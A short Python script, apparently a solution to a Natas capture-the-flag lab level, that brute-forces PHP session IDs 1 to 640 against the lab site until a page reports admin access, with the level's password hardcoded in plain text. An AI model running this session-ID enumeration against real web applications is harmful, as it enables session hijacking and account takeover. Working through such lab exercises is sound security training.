#!/usr/bin/env python

import requests
import re
from string import ascii_lowercase, ascii_uppercase, digits

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()
# response = session.get(url, auth=(username, password))
# response = session.post(url, data={
#                         'username': 'please', 'password': 'subscribe'}, auth=(username, password))

for session_id in range(1, 641):
    response = session.get(url, cookies = {"PHPSESSID": str(session_id)}, auth = (username, password))
    content = response.text

    if( "You are an admin" in content):
        print('You got it', session_id)
        print(content)
    else:
        print('Still trying', session_id)


# response = session.get(url, cookies = {'PHPSESSID': '1'}, auth=(username, password))

# content = response.text
# output = open('output.html', 'w')
# output.write(content)


# print(content)
# print(session.cookies)

